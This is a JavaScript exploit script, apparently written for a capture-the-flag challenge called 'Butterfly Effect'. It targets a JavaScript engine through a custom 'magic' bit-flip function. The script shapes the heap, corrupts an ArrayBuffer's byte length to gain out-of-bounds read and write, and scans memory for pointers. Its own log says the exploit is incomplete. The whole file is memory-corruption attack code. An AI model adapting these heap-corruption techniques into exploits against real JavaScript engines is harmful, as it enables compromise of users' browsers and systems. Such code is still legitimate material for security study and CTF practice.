// Butterfly Effect - Corrupt ArrayBuffer
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u64 = new BigUint64Array(buf);
const u32 = new Uint32Array(buf);
const u8 = new Uint8Array(buf);

function d2u(d) {
    f64[0] = d;
    return u64[0];
}

function u2d(u) {
    u64[0] = u;
    return f64[0];
}

// Strategy: corrupt an ArrayBuffer's byte_length to get OOB read/write
// Create array with many properties to control heap layout
const N = 73;
let arr = [1.1, 2.2];
for (let i = 0; i < N; i++) {
    arr['p' + i] = i;
}

// Create target ArrayBuffer
let ab = new ArrayBuffer(0x80);
let dv = new DataView(ab);

// Original length
console.log("Original ArrayBuffer length:", ab.byteLength);

// The ONE bit flip - try to corrupt ArrayBuffer's byte_length
// Bit 43 = bit 11 of the upper 32 bits = bit that makes length huge
arr.magic(arr.length, 32 + 11);

console.log("After magic - ArrayBuffer length:", ab.byteLength);

if (ab.byteLength > 0x80) {
    console.log("SUCCESS! ArrayBuffer length corrupted to:", ab.byteLength.toString(16));
    
    // Now we have OOB read/write on the ArrayBuffer
    // We can use this to read/write adjacent objects
    
    // Try to find and read the flag file
    // Create some objects to find in memory
    let marker1 = {};
    let marker2 = {};
    
    // Scan memory looking for interesting pointers
    for (let i = 0; i < Math.min(0x1000, ab.byteLength / 8); i++) {
        try {
            let val = dv.getBigUint64(i * 8, true);
            if (val > 0x1000n && val < 0x800000000000n) {
                // console.log(`Offset ${(i*8).toString(16)}: 0x${val.toString(16)}`);
            }
        } catch (e) {
            break;
        }
    }
    
    console.log("Exploit: OOB ArrayBuffer achieved, but need more primitives for full exploit");
    
} else {
    console.log("FAILED - ArrayBuffer length not corrupted");
    console.log("Length is still:", ab.byteLength);
}
